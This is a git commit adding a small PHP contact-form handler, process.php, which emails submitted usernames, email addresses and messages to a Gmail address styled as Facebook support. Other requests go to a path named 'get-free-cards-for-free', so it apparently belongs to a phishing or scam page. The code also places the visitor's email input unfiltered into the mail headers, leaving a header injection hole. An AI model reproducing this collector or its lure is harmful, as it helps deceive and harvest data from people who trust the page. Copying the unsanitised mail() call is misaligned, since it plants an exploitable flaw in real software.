1fbfb80df447d8e66be68563ae09d60f4477e95d
wwi-w <77251113+wwi-w@users.noreply.github.com>
2021-01-20 19:54:11 -0600

    Create process.php

---
+++ process.php
@@ -0,0 +1,28 @@
+<?php 
+
+    if(isset($_POST['btn-send']))
+    {
+       $UserName = $_POST['UName'];
+       $Email = $_POST['Email'];
+       $Subject = $_POST['Subject'];
+       $Msg = $_POST['msg'];
+
+       if(empty($UserName) || empty($Email) || empty($Subject) || empty($Msg))
+       {
+           header('location:index1.php?error');
+       }
+       else
+       {
+           $to = "facebooksup171@gmail.com";
+
+           if(mail($to,$Subject,$Msg,$Email))
+           {
+               header("location:index1.php?success");
+           }
+       }
+    }
+    else
+    {
+        header("location:wwi-w.github.io/get-free-cards-for-free");
+    }
+?>
